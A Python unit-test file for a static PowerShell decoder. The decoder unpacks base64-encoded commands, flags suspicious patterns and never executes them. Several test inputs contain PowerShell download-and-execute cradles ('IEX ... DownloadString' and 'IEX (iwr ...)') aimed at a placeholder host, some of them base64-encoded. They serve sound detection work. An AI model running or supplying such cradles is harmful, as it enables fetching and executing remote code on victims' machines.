from __future__ import annotations

import base64
import gzip
import unittest
from unittest.mock import patch

from cat_app import powershell


def _encoded(text: str, encoding: str = "utf-16le") -> str:
    return base64.b64encode(text.encode(encoding)).decode("ascii")


class PowerShellDecodingTests(unittest.TestCase):
    def test_utf16le_encoded_command_preserves_script_and_provenance(self) -> None:
        script = "Write-Output '정상 진단'"
        result = powershell.analyze_powershell_content(
            f'powershell.exe -NoProfile -EncodedCommand "{_encoded(script)}"'
        )
        self.assertEqual(result["status"], "decoded")
        decoded = result["decoded_scripts"][0]
        self.assertEqual(decoded["text"], script)
        self.assertEqual(decoded["encoding"], "utf-16le")
        self.assertEqual(decoded["source"], "command_line")
        self.assertEqual(decoded["method"], "encoded_command")
        self.assertEqual(decoded["depth"], 1)
        self.assertEqual(len(decoded["decoded_sha256"]), 64)
        self.assertEqual(result["signals"], [])
        self.assertTrue(result["decoding_only_is_not_malicious"])

    def test_common_abbreviations_paths_and_quote_styles(self) -> None:
        script = "Get-Date"
        for flag in ("-enc", "-e", "-ec", "-EncodedC", "-ENCODEDCOMMAND"):
            with self.subTest(flag=flag):
                result = powershell.analyze_powershell_content(
                    f'cmd /c "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" {flag} \'{_encoded(script)}\''
                )
                self.assertEqual(result["decoded_scripts"][0]["text"], script)

    def test_utf8_fallback_and_bom(self) -> None:
        for encoding, expected in (("utf-8", "utf-8"), ("utf-8-sig", "utf-8"), ("utf-16", "utf-16le")):
            with self.subTest(encoding=encoding):
                result = powershell.analyze_powershell_content(
                    f"pwsh -enc {_encoded('Write-Output 42', encoding)}"
                )
                self.assertEqual(result["decoded_scripts"][0]["text"], "Write-Output 42")
                self.assertEqual(result["decoded_scripts"][0]["encoding"], expected)

    def test_download_execution_signals_are_static_and_not_malware_verdict(self) -> None:
        script = "IEX ((New-Object Net.WebClient).DownloadString('https://example.invalid/demo.ps1'))"
        result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(script)}")
        self.assertIn("download_and_execute_pattern", result["signals"])
        self.assertNotIn("malicious", result)
        self.assertTrue(result["decoding_only_is_not_malicious"])

    def test_quoted_command_names_and_plain_base64_are_not_suspicious(self) -> None:
        script = "Write-Output 'IEX (New-Object Net.WebClient).DownloadString(hello)'"
        result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(script)}")
        self.assertEqual(result["signals"], [])
        self.assertEqual(powershell.analyze_powershell_content(_encoded(script))["status"], "not_encoded")
        self.assertEqual(powershell.analyze_powershell_content(f"other.exe -enc {_encoded(script)}")["status"], "not_encoded")

    def test_literal_from_base64_string_and_nested_decode(self) -> None:
        inner = "Write-Output 'nested benign content'"
        outer = "[System.Convert]::FromBase64String('" + _encoded(inner, "utf-8") + "')"
        result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(outer)}")
        self.assertEqual(result["status"], "decoded")
        self.assertEqual([item["text"] for item in result["decoded_scripts"]], [outer, inner])
        self.assertEqual(result["decoded_scripts"][1]["parent_index"], 0)
        self.assertEqual(result["decoded_scripts"][1]["depth"], 2)
        self.assertEqual(result["decoded_scripts"][1]["method"], "from_base64_string")
        block = powershell.analyze_powershell_content(script_block=outer)
        self.assertEqual(block["decoded_scripts"][0]["source"], "script_block")

    def test_invalid_empty_binary_and_variable_inputs_do_not_raise(self) -> None:
        inputs = (
            "powershell -enc !!!!",
            'powershell -enc ""',
            "powershell -enc",
            "powershell -enc ABCDE",
            "[Convert]::FromBase64String($payload)",
            "[Convert]::FromBase64String('AAAAAA==')",
        )
        for script in inputs:
            with self.subTest(script=script):
                result = powershell.analyze_powershell_content(script_block=script)
                self.assertEqual(result["status"], "failed")
                self.assertTrue(result["warnings"])
                self.assertEqual(result["decoded_scripts"], [])

    def test_no_execution_of_decoded_content(self) -> None:
        # A sentinel call is retained as evidence only; no dynamic evaluator or
        # process entry point may run as a consequence of decoding.
        script = "Write-Output 'static'; Start-Process SHOULD_NEVER_RUN"
        with patch("subprocess.run", side_effect=AssertionError("execution")), patch(
            "os.system", side_effect=AssertionError("execution")
        ), patch("builtins.eval", side_effect=AssertionError("evaluation")):
            result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(script)}")
        self.assertEqual(result["decoded_scripts"][0]["text"], script)

    def test_compressed_payload_is_not_expanded(self) -> None:
        compressed = base64.b64encode(gzip.compress(b"Write-Output 'hello'" * 2000)).decode("ascii")
        with patch("gzip.decompress", side_effect=AssertionError("decompression")):
            result = powershell.analyze_powershell_content(
                script_block=f"[Convert]::FromBase64String('{compressed}')"
            )
        self.assertEqual(result["status"], "failed")
        self.assertEqual(result["decoded_scripts"], [])

    def test_mixed_literal_and_unresolved_expression_report_partial_coverage(self) -> None:
        result = powershell.analyze_powershell_content(
            script_block="[Convert]::FromBase64String('" + _encoded("Get-Date")
            + "'); [Convert]::FromBase64String($variable)"
        )
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["decoded_scripts"][0]["text"], "Get-Date")
        self.assertTrue(result["warnings"])

    def test_other_powershell_flags_are_not_encoded_commands(self) -> None:
        for flag in ("-ExecutionPolicy", "-EncodedArguments", "-EncodedCommandInvalid"):
            with self.subTest(flag=flag):
                result = powershell.analyze_powershell_content(f"powershell {flag} {_encoded('Get-Date')}")
                self.assertEqual(result["status"], "not_encoded")

    def test_korean_utf8_and_utf16be_are_identified_without_garbled_text(self) -> None:
        script = "Write-Output '안녕하세요 진단 결과'"
        for encoding in ("utf-8", "utf-16be"):
            with self.subTest(encoding=encoding):
                result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(script, encoding)}")
                self.assertEqual(result["decoded_scripts"][0]["text"], script)
                self.assertEqual(result["decoded_scripts"][0]["encoding"], encoding)
                self.assertEqual(result["signals"], [])

    def test_powershell_name_in_other_executable_arguments_is_not_a_host(self) -> None:
        encoded = _encoded("IEX (iwr https://example.invalid/test)")
        for command in (
            f"notepad.exe powershell -enc {encoded}",
            f"echo powershell -enc '{encoded}'",
            f'python.exe --description "powershell -enc \'{encoded}\'"',
        ):
            with self.subTest(command=command[:35]):
                result = powershell.analyze_powershell_content(command)
                self.assertEqual(result["status"], "not_encoded")
                self.assertEqual(result["signals"], [])
        wrapped = powershell.analyze_powershell_content(f'cmd.exe /d /s /c "powershell -enc {encoded}"')
        # The final quote belongs to cmd's wrapper, not the Base64 argument.
        self.assertEqual(wrapped["status"], "decoded")
        self.assertIn("download_and_execute_pattern", wrapped["signals"])

    def test_json_html_comments_and_quoted_script_mentions_are_data(self) -> None:
        literal = "[Convert]::FromBase64String('" + _encoded("IEX (iwr https://example.invalid/test)") + "')"
        for block in (
            '{"example":"' + literal + '"}',
            '<div title="' + literal + '">description</div>',
            'Write-Output "' + literal + '"',
            "# " + literal,
            "<# " + literal + " #>",
        ):
            with self.subTest(block=block[:25]):
                result = powershell.analyze_powershell_content(script_block=block)
                self.assertEqual(result["status"], "not_encoded")
                self.assertEqual(result["signals"], [])

    def test_decoded_html_remains_literal_evidence_not_executed_markup(self) -> None:
        text = '<div title="IEX (iwr https://example.invalid/test)">진단</div>'
        result = powershell.analyze_powershell_content(f"powershell -enc {_encoded(text)}")
        self.assertEqual(result["decoded_scripts"][0]["text"], text)
        self.assertEqual(result["signals"], [])

    def test_uninspected_tail_is_not_reported_as_no_encoding(self) -> None:
        result = powershell.analyze_powershell_content(
            "powershell " + " " * powershell.MAX_POWERSHELL_INPUT_CHARS
            + "-enc " + _encoded("Get-Date")
        )
        self.assertEqual(result["status"], "partial")
        self.assertTrue(result["input_truncated"])
        self.assertTrue(result["warnings"])

    def test_repeated_calls_do_not_share_mutable_results(self) -> None:
        command = "powershell -enc " + _encoded("Write-Output 'benign'")
        first = powershell.analyze_powershell_content(command)
        first["decoded_scripts"][0]["text"] = "changed"
        first["signals"].append("not a real signal")
        second = powershell.analyze_powershell_content(command)
        self.assertEqual(second["decoded_scripts"][0]["text"], "Write-Output 'benign'")
        self.assertEqual(second["signals"], [])

    def test_oversized_input_token_and_text_are_explicitly_bounded(self) -> None:
        result = powershell.analyze_powershell_content(
            "powershell -enc " + "A" * (powershell.MAX_POWERSHELL_INPUT_CHARS + 100)
        )
        self.assertTrue(result["input_truncated"])
        self.assertTrue(result["truncated"])
        self.assertEqual(result["status"], "failed")
        result = powershell.analyze_powershell_content(
            "powershell -enc " + _encoded("Write-Output '" + "x" * 16_000 + "'")
        )
        self.assertEqual(result["status"], "partial")
        self.assertTrue(result["decoded_scripts"][0]["text_truncated"])
        self.assertLessEqual(len(result["decoded_scripts"][0]["text"]), powershell.MAX_DECODED_SCRIPT_CHARS)

    def test_nested_depth_and_item_count_are_bounded(self) -> None:
        text = "Write-Output 42"
        for _ in range(powershell.MAX_DECODE_DEPTH + 1):
            text = "[Convert]::FromBase64String('" + _encoded(text, "utf-8") + "')"
        result = powershell.analyze_powershell_content(script_block=text)
        self.assertEqual(result["status"], "partial")
        self.assertTrue(result["truncated"])
        self.assertLessEqual(len(result["decoded_scripts"]), powershell.MAX_DECODE_DEPTH)
        text = ";".join(
            "[Convert]::FromBase64String('" + _encoded(f"Write-Output {index}") + "')"
            for index in range(powershell.MAX_DECODED_SCRIPTS + 4)
        )
        result = powershell.analyze_powershell_content(script_block=text)
        self.assertTrue(result["truncated"])
        self.assertLessEqual(len(result["decoded_scripts"]), powershell.MAX_DECODED_SCRIPTS)

    def test_total_display_budget_and_repeat_detection(self) -> None:
        text = ";".join(
            "[Convert]::FromBase64String('" + _encoded(f"Write-Output '{index}" + "x" * 8_000 + "'", "utf-8") + "')"
            for index in range(6)
        )
        result = powershell.analyze_powershell_content(script_block=text)
        self.assertTrue(result["truncated"])
        self.assertLessEqual(sum(len(item["text"]) for item in result["decoded_scripts"]), powershell.MAX_TOTAL_DECODED_SCRIPT_CHARS)
        repeated = "[Convert]::FromBase64String('" + _encoded("Get-Date") + "')"
        result = powershell.analyze_powershell_content(script_block=repeated + ";" + repeated)
        self.assertEqual(len(result["decoded_scripts"]), 1)


if __name__ == "__main__":
    unittest.main()
